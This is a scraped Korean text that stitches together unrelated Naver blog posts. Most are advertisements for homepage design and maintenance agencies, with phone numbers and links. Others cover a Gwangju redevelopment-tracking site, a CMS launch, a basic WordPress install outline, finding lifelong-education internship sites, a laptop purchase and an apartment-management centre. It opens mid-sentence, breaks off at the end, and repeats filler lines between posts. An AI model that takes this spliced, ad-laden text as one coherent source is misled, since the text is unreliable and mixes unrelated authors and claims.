부분이지요.그래서 길게는 수개월에 걸쳐서 홈페이지 리뉴얼 사업을 진행하는 기업들도 많이 있습니다.남들이 다하는 디자인과 메뉴구성, 프로그램보다우리만의 차별화된 홈페이지 제작을 위해서 이것 저것 연구하고 아이디어 회의를 거치기 때문이지요^^  홈페이지를 통해 고객방문을 유도하고그것이 매출로 이어질 수 있게끔 마케팅전략이 녹아들어간 홈페이지 제작으로 홈페이지 제작의 효과를 맛보셨으면 합니다^_^ 홈페이지 제작을 앞두신 분들께 조금이나마 도움이 되었으면 하네요^^ 다음 포스팅에서 또 뵙겠습니당~~~ㅎㅎㅎ     네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가이웃님들은 이른 아침 잠에서 깨면 가장 먼저 뭘 하세요?저는 오늘 하루 또 무슨 이야기로 이웃님들을 찾아갈까 고민한답니다. ^^저의 고민이 담긴 홈페이지제작및관리에 대한 이야기! 유용한 내용만 준비했어요. 함께 해요!온라인 시장에 도전하기로 계획한 이상, 제일 빠르게 생각해야 하는 부분이 바로 홈페이지를 시작하는 일이며,사이트의 유형에는 기업형과 올플래시형, 블로그형 등이 있습니다.홈페이지 제작을 계획한다면, 일반적으로 홈페이지에 대한 전문적인 지식이 부족하기 때문에 홈페이지 제작 전문 업체를 택해서, 제작을 의뢰하는 것이 현명합니다.회사의 홍보를 하기 위한 웹페이지라면 자리를 잡을 때까지 초기 1년 정도를 상담 받는 것이 안전합니다. 그러나 예외적으로 거의 업데이트가 필요 없을 경우라면 직접 운영하는 것도 괜찮습니다.공공기관 또는 산하단체 협회는 신뢰를 기초로 하여 전달력 및 사용자의 편의를 고려하여 홈페이지를 제작해야 합니다.    부정클릭이란 광고비를 빠르게 소진하게 만들려는 악의적인 계획을 가지고 마구잡이로 클릭하는 것을 뜻하는데, 홈페이지 관리비가 많이 들어갈 수 있으므로 로그분석을 통해 파악하는 것이 좋습니다.맞춤형 홈페이지 제작은 인건비가 들기 때문에 솔루션형보다 금액이 더 들지만, 필요한 기능을 맞춰 만들어주고, 전문가가 유지 보수를 해준다는 점에서 장점이 있습니다. 단 기본 디자인, 기본 호스팅으로 저렴하게 홈페이지를 구축하고 싶은 사람이라면 솔루션형을 이용하는 게 효율적일 수 있습니다.전자 결제서비스의 경우, 결제시스템을 통해 카드결제나 실시간 계좌이체 등을 즉시 확인 할 수 있습니다.또한, 매출의 집계나 결제 내역을 관리할 수 있어 편리합니다.홈페이지 방문자의 행태와 경로, 방문한 페이지 등을 분석하는 방법 중 하나로 로그분석 프로그램이라는 것이 있으며,로그분석에 활용하는 액세스로그는 본인 업체의 홈페이지에 접속한 방문객들이 홈페이지를 돌아다니며 요청했던 파일들을 기록해 놓은 로그입니다. 액세스로그의 자료를 분석하여 홈페이지에 들른 고객님들의 관심사를 파악할 수도 있습니다.세련되고 고객의 호기심을 끌어당기는 웹디자인을 원하신다면 디자인팩토리를 찾아주세요.디자인팩토리는 웹사이트부터 모바일 앱, 모바일어플 등 IT 기반의 디자인 솔루션을 제공하는디자인전문업체로 많은 고객으로부터 사랑받고 있습니다.한 획의 글자, 하나의 점에도 여러 가지를 고려하여 제작하고 있으며 소비자가 사용하기 용이하고인상깊은 업체가 될 수 있는 효율적인 디자인을 지향하고 있습니다.마케팅적 지식과 디자인적 노하우로 만족도 높은 디자인을 제작해 드리겠습니다.지금까지 홈페이지제작및관리에 관한 게시물 였는데요~모두 실용적인 시간 되었나요?저도 여러분께 도움이 될 수 있다니! 정말 기쁜데요다음 게시물도 기대해 주세요!    네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가재개발, 재건축 등의 정비사업 시행 계획과 현황을 찾기 위해서 해당 지역 구청/시청 홈페이지에서 도시개발계획과 게시판을 찾아보곤 했습니다.​그런데 해당 지역의 정비사업 관련 정보가 한 곳에 모여진 사이트가 있습니다.바로 정비사업관리시스템 홈페이지입니다.​관심 정비구역의 사업시행인가, 관리처분인가 등의 진행과정을 정확하게 확인할 수 있어 편리합니다.​저는 광주광역시에서 재개발이 잘 진행되고 있는 신가재개발 구역의 사업시행인가 날짜가 언제인지 궁금해서 검색해 보았습니다.2018년 7월 15일이라는 걸 알 수 있습니다.​ 광주광역시 정비사업관리시스템 홈페이지 화면​광주광역시 외의 다른 지역에 대해서도 사이트를 찾아서 업데이트 해나가도록 하겠습니다. 광주광역시 정비사업관리시스템새소식 정비사업전문관리업체 등록현황(2020... 2020-10-21 정비사업 추진현황(2020. 9. 29. 기준) 2020-10-21 정비사업전문관리업 행정처분 현황(2... 2020-07-31 정비사업전문관리업 등록 현황(2020.... 2020-07-16 정비사업 추진현황(2020. 6. 30.) 2020-07-02 고시공고 남구 주거환경개선지구 (감나무골, ... 2020-05-04 신가동 주택재개발 정비사업 관리처 ... 2020-04-10 용보촌 주거환경정비개선 (20191115)... 2019-11-18 남구 재건...hreas.gwangju.go.kr #정비사업#광주광역시정비사업#재개발#재건축#광주재개발#광주재건축#광주정비사업#정비사업관리시스템#사업시행인가날짜확인#관리처분인가날짜확인 기업홈페이지제작관리  다양한 업체들에서 홈페이지를 제작하는 것도 있지만 근본적으로 수익창출 시점은 마케팅, 운영등의 기업홈페이지관리를 진행하면서 발생한다고 할 수 있습니다. 따라서 기본적으로 제작을 하면서 최대한 기업홈페이지관리적인 측면까지 고려된 진행이 되어야 제대로된 수익창출이 될 수 있는 것은 물론 지속적인 효율의 유지할 수 있는 것입니다. 그렇기에 오늘은 기업홈페이지제작관리에 대하여 어떤 부분들을 고려해야 하는지 알아보도록 하겠습니다. 1. 마케팅? 우선 다양한 기업홈페이지제작을 하면서 수익창출을 위해서 마케팅을 진행하시는 경우가 많은데요. 온라인에서의 구매전환은 무엇보다 소비자들이 정보검색을 기반으로 진행이 되기 때문에 이 부분에 있어서는 보통 많은 분들께서 따로 돈을 투자하여 다양한 마케팅을 진행을 하시게 됩니다. 그런데 기본적으로 기업홈페이지제작관리에 대하여 제작과정에서 기본적으로 검색노출에 대한 부분들이 커버될 수 있다는 것을 모르시는 분들이 많습니다. 대표적인 것으로 바로 웹문서 검색페이지를 들 수 있습니다. 무엇보다 다양한 키워드에 대하여 광고를 진행하시는 경우도 있지만 상당히 구매전환율이 높은 정보성키워드들의 경우에는 검색광고 영역등의 비중보다는 웹검색영역이 상당히 높은 노출순위를 지니고 있지요. 따라서 기본적인 검색노출에 있어서 검색로봇들이 정보를 수집하는 데 있어서 최적화된 구조로 진행을 한다면 기업홈페이지제작관리를 통하여 소비자들을 접하는 데에 더욱 높은 효과를 얻을 수 있게 됩니다. 2. 접속환경 변화 기업홈페이지에 대하여 이전까지의 경우에는 단순 PC에서의 검색유입이 대부분이었지만 이제는 다양한 기기들이 발달된 만큼 그에 따라서 소비자들의 온라인 접속환경의 변화를 빼놓을 수 없습니다. 그렇기에 이제는 기업홈페이지제작관리에 있어서 사이트 자체에 대한 웹표준 준수가 필수적이지요. 약간 생소한 내용이시겠지만 어떤 내용인지 쉽게 알려드린다면 우선 내가 보기에는 멀쩡한 홈페이지일 수 있습니다. 하지만 해당 홈페이지에 대하여 웹표준을 준수하지 않고 제작이 되면 화이어폭스, 크롬, 사파리등의 브라우져를 이용하여 혹은 익스플로어의 다른 버젼들을 통하여 홈페이지에 접속하는 경우 홈페이지는 깨져보이거나 혹은 구동이 심하게 느려지는 결과를 초래하게 되는 것입니다. 당연히 정보를 편리하게 이용하고자 하는 소비자들의 구매욕구는 급격하게 하락하는 것은 물론 이탈까지 발생하기 때문에 제대로된 성과를 얻기위해서는 기업홈페이지제작관리에 있어서 웹표준 준수는 반드시 필요하다는 것을 잊지 말아야 겠지요. 3. 디자인  위에서 보시면 다양한 기업홈페이지들이 각양각색의 디자인으로 제작 된 것을 보실 수 있는데요. 최대한 예쁘게 디자인을 하는 이유는 무엇보다 온라인의 특성상 시각적인 어필이 중요하기 때문입니다. 그런데 중요한 것은 수익창출을 위한 기업홈페이지제작에 대한 디자인은 단순한 이미지 전달 이외에도 구매전환에서의 역할을 수행해야 하지요. 바로 기업홈페이지의 구매전환에 대한 흐름을 만들어 주는 역할로서 소비자 구매에 영향을 받는 정보로 자연스럽게 이동할 수 있도록 시선유도를 해주는 것은 물론 온전히 도달한 정보에 집중할 수 있도록 하는 것입니다.  소비자가 유입된 홈페이지에서 이용하게 되는 정보와 컨텐츠에 대한 만족도를 느낄 경우 구매전환 성립 하지만 이런 부분들을 제대로 파악하지 못하고 단순히 이미지 어필만 고려된 디자인이 된다면  홈페이지에 유입된 소비자가 구매전환에 영향을 받는 정보로 자연스럽게 이동이 되지 않는 것은 물론 정보와 컨텐츠에 소비자들이 도달한다고 하더라도 이미지에 정보와 컨텐츠가 눌리고 가독성이 떨어져 온전히 집중을 할수 없는 만큼 구매전환도 떨어지게 되는 것입니다. 따라서 기업홈페이지제작에 있어서 디자인은 시각적인 어필은 기본에 구매전환과 관련된 역할까지 고려되어야 하므로 화려함을 바라보기이전 깔끔한 시선이동이 가능한지가 먼저 생각되어야 한다는 것을 반드시 기억해야 합니다  4. 컨텐츠 구조 기업홈페이지제작을 하는 목적은 어디까지나 수익창출이 목적인 만큼 앞서 말씀드렸던 것처럼 구매전환에 대하여 정보와 컨텐츠의 특성화와 차별성이 중요하다고 할 수 있습니다. 하지만 이부분은 상당히 막막하게 생각하시는 분들이 많은데요.방법은 의외로 간단합니다. 바로 해당 기업에서 이전까지 진행한 실질적인 사업경험을 기반으로 자신들의 타겟고객층은 어떤 정보들을 제공받았을때 민감하게 반응하는지 그리고 어떤 부분에 있어서 만족을 느끼고 구매전환을 진행하였는지 파악을 하여 해당 정보들을 기반으로한 컨텐츠 구조화가 가능한지 기업홈페이지제작 업체를 통하여 알아보도는 것입니다. 상당히 허무한 이야기라고 생각하실수도 있지만 실제적인 경험은 기업홈페이지제작업체보다 해당 기업이 휠씬 많고 그런 컨텐츠 구조화는 주문형 프로젝트를 전문적으로 진행한 경험이 많은 업체에서 진행하는 방식이기 때문에  기업홈페이지제작관리에 대하여 높은 효율을 가져오는 것은 물론 기본적인 제작업체의 옥석을 가릴수 있게 되지요.  기업홈페이지의 목적은 무엇보다 수익창출이고 수익창출은 제작이후 관리를 통하여 진행이 됩니다.어느정도 마케팅이나 기타의 방식을 통하여 수익창출도 있지만 무엇보다 제대로된 성과를 얻기 위해서는 근본이 되어주는 기업홈페이지자체에서 받쳐 주어야 하는 것이 크다고 보는데요. 위의 내용이외에도 다양한 것들이 있을 수 있지만 그 근본은 어디까지나 온라인 소비자들을 위한 시선으로 홈페이지를 바라봐야 한다는 것임을 파악하는 것이 최고의 방법이 아닐까 생각합니다. 기업홈페이지제작 문의☎ 02-542-4590           플래시홈페이지 이렇게 하면 고쳐집니다.​안녕하세요. 작년 게임 업계에서는 주요 사건들이 많았습니다.그중 게임뿐만 아니라 홈페이지와도 연관이 있던 이슈는 바로 '어도비 플래시 플레이어의 종료'였는데요.사실 어도비도 6년 전부터 플래시 사용 지양을 권고해왔습니다.​크롬, 익스플로러, 사파리, 엣지 등 주요 브라우저들도 점진적으로 어도비 플래시 지원을 종료했습니다.이에 따라 플래시로 만들어진 플래시홈페이지의 사용이 어려워졌습니다.플래시로 만든 이미지나 메뉴, 배너가 보이지 않게 된 것입니다.​플래시 게임이 모두 사라진 것은 게임 역사의 한 챕터가 통으로 사라진 것과 같습니다.게임뿐만 아니라 홈페이지에서도 이는 매우 큰 변화인데요.앞으로 플래시를 사용해 홈페이지를 제작할 일은 없을 것이며 이를 대체할 만한 기술들은 충분합니다.​오래도록 운영한 홈페이지에 애착이 있다면 모두 리뉴얼할 필요 없이 플래시 영역을 부분 수정하면 됩니다.최신 웹기술인 HTML5를 통해 플래시를 대체할 수 있습니다.​ 플래시홈페이지 대체 전 모습​모든 기술에는 새로운 트랜드가 존재합니다.기술은 항상 작업을 편리하게, 싸게, 대중적으로 퍼지는 것을 원합니다.이에 합당한 기술은 최신 웹표준이 HTML5입니다.​오래된 플래시홈페이지를 HTML5로 대체함으로써 신속하고, 간단하게 오류를 해결할 수 있습니다.우리 기업의 홈페이지가 위처럼 보이지 않는다면 플래시로 만들었을 가능성이 큽니다.인터넷 발달과 스마트폰의 발달 등으로 이젠 플래시를 사용할 수 없습니다.​플래시의 백터 그래픽 애니메이션은 인터넷 속도가 느렸던 과거에는 엄청난 강점이 있었지만,지금은 CPU에 부하를 줘 발열과 리소스를 잡아먹는 단점이 되었습니다.​ 플래시홈페이지 대체 후 모습​속도, 보안 등 여러가지 문제가 있는 플래시홈페이지만 가장 궁극적으로 홈페이지의 내용을 제대로 확인할 수 없으니 문제입니다.가능한 한 빨리 우리 기업의 홈페이지를 정상적으로 돌려놔야겠죠?당사로 호스팅 이전 시 플래시홈페이지 대체 작업을 무료 지원하고 있으며, 호스팅 이전이 불가능할 시 최저 견적을 제안드리고 있습니다.​기존 홈페이지 관리 업체가 없거나, 업체에서 작업이 불가능한 경우도 많으니 이에 대해 궁금한 점은 언제든지 연락 주시길 바랍니다!플래시홈페이지를 수정하면서 하단 정보나 서브페이지의 문구 등 수정이 필요한 경우에도 지원해드릴 수 있습니다.홈페이지 운영에 어려움을 겪고 계시다면 적극적으로 도움드리겠습니다. ^^​감사합니다.​  플래시홈페이지 수청 접수처http://flash.adcomm.kr​ 홈페이지제작 에이디커뮤니케이션홈페이지제작,무료 모바일홈페이지제작,홈페이지디자인,기업홈페이지제작,홈페이지수정,인천홈페이지제작.flash.adcomm.kr  2​​​012년부터 개발해 오던 ACG의 원웨어 서비스가 드디어 오픈을 했나보다.  원웨어http://www.oneware.co.kr/   솔직히 과연 오픈할 수 있겠어? 란 의구심이 들었던 프로젝트였는데이렇게 짜잔! 하고 오픈할 걸 보니 내가 다 뿌듯하고,꾸준히,천천히,꼼꼼하게 준비한 멤버들의 열정이 대단한것 같다.  여튼 원웨어라는 서비스는 쉽게 말하면 아주 쉽게, 블로그에 글 올리듯이 간단한 절차로 홈페이지를 만들고 z컨텐츠를 관리할 수 있는 CMS솔루션으로단순히 웹사이트만 만들어지는게 아니라 모바일, 타블렛에 최적화되고 최신 디자인트렌드를 반영한 flat한 홈페이지가 만들어지는 것이다. 뿐만 아니라 페이스북이나 카카오스토리 처럼 소셜 기능을 추가해서 사내 네트워크(SNS)로 활용할 수 있는데소셜 페이지에서는 회사 내 공지사항이나 최신 트렌드 공유에서부터 생일축하, 동호회 활동 같은 사적인 이야기도 가능해 언제 어디서나 쉽고 빠르고 긴밀한 커뮤니케이션이 가능하다는 장점이 있다.              서비스 신청은 디자인 고르기  -> 신청정보 입력 -> 결제 -> 제작 상담 -> 제작완료의 프로세스로 이루어 지는데,그동안 홈페이지 생성,운영이 어려웠거나 모바일에서도 최적화된 홈페이지를 만들고자 하는 기업.사내 인트라넷으로 업무효율성 및 SNS를 통해 소통을 하고 싶은 기업이 사용하면 좋을것 같다.​            마지막으로 서비스 이용요금은 년 228만원(월 95,000원)이다.하이웍스나 NOPSPro처럼 무료 인트라넷 서비스들에 비하면 월정액으로 서비스 되는 원웨어가 얼마나 경쟁력이 있을까.란 의문이 든다.하지만 원웨어는 일반적인 그룹웨어에서 한단계 진화한 반응형 홈페이지 제작 + 그룹웨어 + 소셜 CMS 인점을 생각해 본다면,경쟁력이 있을것 같다.              서비스 체험하기http://www.oneware.co.kr/      http://www.oneware.co.kr/            네이버 블로그는 맞지만, 확인불가[홈페이지제작/제작관리]  워드프레스 초보1 ﻿ ﻿ 요즘 새봄 새단장을 맞이하여 홈페이지리뉴얼이나 제작에 관한 문의를 주시면서워드프레스로 제작가능하냐고들 많이 물어보시고 아니면 워드프레스라는 게 있는데그건 뭐냐고들 많이 물어보시더라구요! 워드프레스 초보자로서 함께 워드프레스에 대해 알아가는 시간을 가져볼까 합니다.   워드프레스(WordPress)는 왜 만들어졌나?홈페이지제작을 위해서 사람의 작업노력이 상당히 필요한 부분이 있습니다. 홈페이지디자인을 하고 홈페이지 내 필요한 기능을 구현하고 홈페이지가 사용자들에게 잘 보일 수 있도록 호스팅서버도 따로 구축하고지속적인 관리를 위해 많은 노력이 필요합니다. 이러한 콘텐츠관리시스템(CMS)은 이런 과정을 모두 단순하게 만들어주는 도구인데요~워드프레스는 소스코드가 공개된 오픈 소스 CMS 중 하나입니다.   워드프레스(WordPress)는 쉽게 말해 이런 것!한마디로 말하면, 홈페이지를 제작하고 관리하기 쉽게 만든 저작도구라고 할 수 있습니다.세계 최대의 오픈 소스 저작물관리시스템으로, 2003년 매트 뮬렌웨그가 창립했습니다.   워드프레스(WordPress)의 기능은 이런 것!워드프레스는 템플릿 시스템을 사용합니다. 즉 홈페이지 디자인과 기능을 할 수 있는 것을 준비한 후내용만 삽입하도록 제작해둔 홈페이지 제작툴이라고 할까요? 그래서 누구나 무료로 웹에서 콘텐츠를 제작할 수 있습니다.웹표준도 잘 따르고 있고 홈페이지 관리기능도 함께 갖추고 있어 사용하기 편리합니다.조금 더 들어가서 기술적으로 풀어보면 PHP와 HTML 코드 수정없이도 다시 정리할 수 있는 위젯이 포함되어 있고테마도 설치해 자유롭게 전환할 수 있습니다. 테마안의 PHP와 HTML코드는 좀 더 세분화된 맞춤페이지를 위해 편집할 수 있습니다.또한 링크 관리체계가 갖추어져 검색엔진에 친화적이고 깔끔한 퍼머링트 구조와 기사에 여러 카테고리를 설정할 수 있습니다.   워드프레스(WordPress) 설치, 요렇게 해보세요!1. 자신이 호스팅하는 MySQL 의 데이터베이스이름과 DB사용자, DB 비밀번호를 확인한 뒤 워드프레스를 내려받기 합니다.2. wp-config-sample.php 파일을 열어 내 환경에 맞게 변경해 wp-config-php로 저장하고, 모든 파일을 호스팅하는 서버에 올립니다. 3. 기본설치 완료 후 제작하고자 하는 홈페이지디자인의 테마를 내려받기 합니다.4. 다양한 확장기능을 활용하면 음악이나 동영상 등 원하는 기능을 쉽게 첨부할 수 있습니다. 워드프레스(WordPress)의 좋은 점, 이런게 있어요HTML을 알지 않아도 쉽게 홈페이지 수정 및 메뉴구성을 자유롭게 할 수 있습니다.모바일웹사이트를 지원하는 '모바일반응형 웹디자인'으로 제작되기 때문에 모바일 전용 홈페이지제작을 안해도 됩니다. 트위터나 페이스북 등 sns와의 연동도 쉽습니다.       홈페이지유지보수/홈페이지관리/홈페이지문의​홈페이지 유지보수 및 관리에 대해 알아보겠습니다.홈페이지를 제작하시고 나서 오래 사용하기 위해서는 꾸준한 관리와 유지보수가 필요합니다.디자인을 한달에 한번씩 교체하거나 디자인적 요소가 변하게 되면 업체와유지보수 계약을 맺으셔서 꾸준하게 관리를 받으시는게 좋습니다.   팝업제작, 배너제작, 디자인교체 등을 유지보수 내역에 포함시켜 유지보수 계약이 이루어집니다.홈페이지는 제작도 중요하지만 오래사용할 수 있는 조건을 만드는 것도 중요합니다. 기업 홈페이지의 경우 기업을 대표하는 공간이기 때문에 자주 바뀌면 안됩니다.따라서 오래사용할 홈페이지를 만든다는 생각으로 장기적 투자를 하시는게 좋습니다. 홈페이지제작, 더이상 아무 업체에게나 맡기지 마시고믿을 수 있는 감각디자인과 상의하세요^^   ​ #평생교육학과 #평생교육실습#평생교육실습기관 #평생교육사자격증 ​  안녕하세요! 꿍이언니입니다!​​ 저는 국제사이버대학에 편입하여 평생교육학을 공부하고 있습니다. ​ ​이번 학기에 실습을 앞두고 있는데요!​​ 평생교육실습은 본인 스스로 해야 하기에 처음 실습을 해보시는 분들은​일단 첫 번째 관문인 실습기관을 찾는 일부터막막하고 어렵습니다...​​ 그래서 도대체 실습기관이 어디야?실습 신청은 어떻게 하는 거야?   ​​ 인터넷에 떠도는 자료들은   전부 다 광고글뿐... ​​​정보의 바다에서 헤매고 계시는 많은 분들을 위해​​​ <평생교육 실습기관 쉽게 찾는 방법> ​딱! 정리하여 알려드립니다!​  ​  평생교육사 자격관리 홈페이지​모든 국가자격증은 자격관리 홈페이지를 통해관리되고 있다는 사실! 알고 계셨나요?​​평생교육사2급 자격증 역시교육부가 발급하는 국가자격증으로 자격관리 홈페이지가 있는데요!​​ 평생교육 실습기관이 직접 입력한 실습 정보들을  누구나 쉽게 확인 가능합니다!꿍이언니​  평생교육 실습기관 찾기 실제편! ​​평생교육사 자격관리 홈페이지 바로 가기↓↓↓↓↓↓↓↓↓↓↓↓↓↓ 평생교육사 자격관리Lifelong Learning Educator 1 2 1 공지사항 [안내] '평생교육의 미래 전망' 개최 (7.21, 유튜브 라이브) [공고]2020년도 제3차 평생교육사 자격증 발급 신청 공고 [안내] 2020년 평생교육사 1급 승급과정 연수대상자 [공지] 2020년 제2차 평생교육사 자격취득조회 안내 [공유] 2020년 제17회 대한민국 평생학습대상 선발 공고 + 일반회원 실습기관 평생교육사 양성기관 회원가입 | 아이디 / 비밀번호 찾기 등급별 자격요건 등급별 자격요건 나에게 맞는 등급별 자격요건 알아보기 View More ▶...lledu.nile.or.kr ​​* 홈페이지에서 직접 캡처해봤습니다.  ​  ​1. 자격관리 홈페이지 접속 2020.07 기준 메인 화면 2. [실습기관 정보] 👉 [실습생 모집]   3. 실습기관 검색​① 지역 설정 전체 보기 "▼"  누르기 👉  원하는 시·도,  시·군·구 설정(본인 거주지 근처로 하세요. 가까운 곳이 최고!😄)​ ​* 예시 : 인천 지역, 전체 ​- 기관 유형 세부항목도 있지만 굳이 선택 안 해도 됨😅- 기관명을 알고 있다면 직접 입력하여 검색 가능!  ② 모집 기간, 운영방식 설정 ​- ✅ 모집 예정, 모집 중, 수시모집, 마감 中 선택   (모집 예정, 마감은 필요 없겠죠?😏)- ✅ 주 중, 주말, 주간, 야간 中 선택  ③ 검색 누르기 👉 한 번에 볼 수 있는 게시글 개수 설정 가능! - 보기 편하게 조정해보세요😋  ③ 실습기관 정보 확인! 실습기관 정보, 실습 정보, 실습 지도자 정보자세한 확인 가능!꿍이언니※ 예시 : 대한안전연합※ 기관이 전체 공개한 정보이기 때문에 모자이크 하지 않음 ⭐️ 홈페이지 주소 클릭 시 바로 가기 가능⭐️ 대표전화, 팩스번호 확인가능⭐️ 담당자명, 담당자 전화번호, 기관 이메일 확인 가능​ 💣주의사항 💣​실습기관에서 최신 내용을 업데이트 하지 않는 경우도 있으니꼭 기관 홈페이지 공지사항이나전화문의를 해보시고최신 정보를 확인하시기 바랍니다.꿍이언니⭐️ 모집인원, 실습비, 모집방법 확인 가능실습비 부담이 적을수록 좋겠죠?😌​⭐️ 기타 사항 : 기관에서 원하는 실습 관련 세부내용 확인 가능⭐️ 첨부파일 : 기관이 제공하는 양식들 확인 가능   ​ 첨부파일 유무는 기관별로 다름!실습신청서 양식, 자기소개서 양식을 첨부한 기관은 자체 양식으로만접수 받음으로 꼭! 확인해야함꿍이언니  실습지도자 자격을 갖춘 지도자가실습기간에 근무하고 있어야만실습 인정됩니다.(실습날짜와 실습시간 확인필수!)꿍이언니 4. 실습신청하기⭐️ 이메일접수, 전화접수, 방문접수 등 실습기관별로 상이함​​  ​지금까지  <평생교육 실습기관 쉽게 찾는 방법> 을 함께 알아보았습니다.​자신의 형편에 꼭 맞는실습기관 찾기에 성공하시길!​ 제 글이 도움이 되셨다면  공감과 댓글 부탁드립니다!  *서이추 환영해요* ​  ​​ 네이버 블로그는 맞지만, 확인불가삼성노트북 구매했어요...삼성노트북 강추 입니다...기존에 사용한 노트북도 삼성 제품이었습니다...​​​한국보타니커미술협회 노트북으로 블로그 홈페이지 카페 관리 합니다...제가 운영 하고 있는 모든 시스템을 총 가동 시켜 더욱 울산 보타니컬아트를 알리고 홍보 하려 합니다...그리고 새로운 아이템도 지금 준비 하고 있습니다...협회 부속 교육기관으로 등록 하여 체계적으로 운영 하려 합니다...자격증 및 작가반 모집을 진행 하려 합니다...기대해 주세요......​​​​노트북 윈도우 실행하여제 블로그부터 확인 했습니다...화이트 칼라 삼성 노트북 멋지죠...​​삼상 노트북 박스 개봉...기대에 부풀은 마음...칼라 잉크제 복합기도 함께 배송..ㅎ  ㅎ  기분 좋아요...​ 설치 및 사용 설명서...잘 보관해 두어야 겠죠...설치는배송 하시는 분이 친절히 해주었어요...삼성 설치 친절한 서비스 좋았어요...​ 박스에서꺼낸 노트북 비닐을 벗기지 않고찍어 보았어요...​​​ 복사. 스캔. 인쇄까지....복합기  아주 유용하게 많이 이용 할 듯 합니다...​​ 휴대용 가방도 함께 주시네요...휴대 할 일은 별로 없을 듯 합니다...ㅋ  ㅋ​ ​​​설치 완료 후 부팅하여 인터넷 실행 ....칼라도 마음에 들고 모든게 흡족...ㅎ  ㅎ 열심히 블로그 홈페이지 카페 관리 해야 겠어요...27일 금요일협회 작가 송년 및 총회 모임이있었습니다...많은 작가님들이 참여 하여 유익하고 좋은 시간을 가졌습니다...곧 모임 후기 올리겠습니다...오늘 즐거운 주말 입니다...저는 오늘도 교육장에 갑니다...좋은 주말 되세요...한국보타니컬미술협회  홈페이지 바로가기   www.botaart.commodern-art-gal-kowww.botaart.com.​​​ 우리 국민 대다수가 아파트를 비롯한 공동주택에 살고 있는데요. 더욱 투명하고 효율적인 운영과 관리로 웃음과 행복이 있는 아파트를 만들기 위해 중앙공동주택관리지원센터가 함께하겠습니다.     찾아가는 관리 도우미 및 컨설팅 서비스는 관리 전문가가 현장을 직접 방문하여 더 나은 관리 방향을 제시하고, 생생한 현장스케치를 공유합니다.  공동주택관리 상담은 아파트 관리, 층간소음 등 공동주택 관련 궁금증이나 고충에 대해 전문가가 상담해드립니다.  공동주택관리 온라인교육은 인터넷이나 모바일 기기를 통해 손쉽게 법정 교육을 이수할 수 있습니다.센터 홈페이지 › 교육마당 › 온라인교육 공동체 활성화 지원은 우수커뮤니티 공모 및 관리비 살펴보기 등 공유가치 확산을 위한 미담 사례를 공유합니다. 열린 강좌는 공동주택의 투명하고 효율적인 관리와 공사기술 지원을 위해 매월 무료 열 강좌를 개최하고 교육자료 제공합니다.   공동주택관리 정보 통합 제공은 공동주택 관계법령, 지자체자치법규, 지자체관리규약준칙, 관리업무 매뉴얼 및 가이드북, 표준계약서식, 센터 최변호사의 판례해설 등 산재하여 있는 공동주택관리의 유용한 정보를 통합 제공합니다. 공동주택관리 새소식 제공은 센터소식 및 공동주택관리 관련 뉴스, 국토부 보도자료, 지자체 공동주택 지원사업 정보 등 공동주택관리 새소식을 업데이트하여 제공합니다.   기업홈페이지제작 업체 정확한 선택!​ ​연말 분위기는 더는 없는 듯 하네요ㅠㅠ잠시 다녀왔던 드라이브는 텅빈 거리로정말 속상한 마음인데요.3단계로 올라갈지도 모르는 상황이마치 경기상황처럼 차갑게 느껴져요.​ ​기업홈페이지제작 관련으로 업체의비용과 효과적인 선택에 대해자세히 알아볼까 합니다.기업과 자영업자들이 정말힘든 요즘에 도움되시기를 바랄게요.​ ​기업홈페이지를 통해 일반적인회사의 홍보, 임원진, 영업내용 등등알아볼 수 있는데요.사업관련해서 제조품을 찾아손수 연락하는 경우가 있어요.​ ​그치만 홈페이지 제작은 원하는 용도또는 영역 구성에 맞춰 비용도 너무 다른데요.그러기에 더욱 제작업체를 고르는 것이쉽진 않죠. 중요한 내용을 쫙 확인해서선택하는 법을 알아보도록 할게요.​ ​처음 구성을 따지다 보면 임대형이나독립형 중 무엇으로 시작할지선택을 해야 하는데요.단순하게 설명하자면임대형은 주기적인 연장계약으로홈페이지의 소유권 그리고임의수정이 불가하고,거기다 계약시에 비용적으로수수료가 붙게 됩니다.​ ​그에 비해 독립형은 5년후에비용은 없기 때문에 장기적 운영을하는 사업장에 적절하고,홈페이지 소유권이 회사로 되어서임의수정도 가능하죠.비용적인 면에서 84%의 절감도 되구요.​ ​방향에 따라서 디자인을 하는 곳이나탬플릿 형태가 아니고 전문 디자인이직점 회사를 원하는 분위기를선택해야 하는데,이번 내용은 수많은 홈페이지제작을 통해 여러 프로그램이개발되고 효과적인 선택을 위한도움을 드리는 곳으로 알려 드릴게요.​ ​각각 PC와 모바일 반응형에 따라서합리적으로 진행할 수 있는 곳이라고할 수 있어요.​기업홈페이지제작을 마냥 홈페이지를만든다고 끝이 아니에요.홈페이지 도메인 등록과 필수인 방화벽셋팅 작업, 바이러스와 랜섬웨어 등등피해는 최소화해야 하니까홈페이지 부가 관리가 중요합니다.​ ​이런걸 미리 확실하게 파악하셔야 하는데그렇지 않으면 추가로 시간과 비용이 들게 되는 귀찮음이 생길 수 있죠.마냥 홈페이지 제작 만 하는게 아니라섬세하게 마무리도 체크해주는 곳으로선택하세요.​ ​이렇게 기업홈페이지제작업체 선택시에따져봐야 할 내용과 비용을 알아봤는데요.다양한 구성도 따져보아서홈페이지제작에 각자 회사와 최적인지선택하시면 되세요.한 업체만 보고 시작하기 보단최소 두 군데 이상 알아 보시는 것이보다 효과적일거에요.​​홈페이지 제작문의는웨일즈소프트로 문의하세요!!!1661-9440​카톡문의​ 웨일즈소프트#홈페이지제작#모바일웹앱제작#쇼핑몰#도메인#호스팅#홈페이지유지보수#그누보드#영카트#반응형open.kakao.com ​톡톡문의​ 웨일즈소프트 - 네이버톡톡홈페이지제작, 모바일웹/앱, 쇼핑몰, 도메인, 호스팅 전문 기업입니다.talk.naver.com ​홈페이지바로가기​ 웨일즈소프트홈페이지제작, 쇼핑몰, 모바일, 도메인, 서버/웹호스팅, 웹사이트 개발, 유지/보수, 개인/기업/회사/반응형 웹 등 온라인 웹서비스 전문 업체입니다.whalessoft.com ​  ​​​​  시간의 법칙이란 게 있습니다. 나날이 일정한 시간을 부지런히 하면 그 분야에서는 분명원하는 바를 이룰 수 있다는 뜻이래요. 저도 이 시간의 법칙을 믿어보기로 했어요. 여러분에게 홈페이지제작및관리에 대한 정보를 꾸준히 줘서 전문가가 돼 보려고 합니다.여러분도 이 시간을 같이 채워나간다면 그럴 수 있을 거예요~ 온라인 마케팅을 하고 있는 기관들은 계속해서 치열해지는 경쟁 상황 속에서, 보다 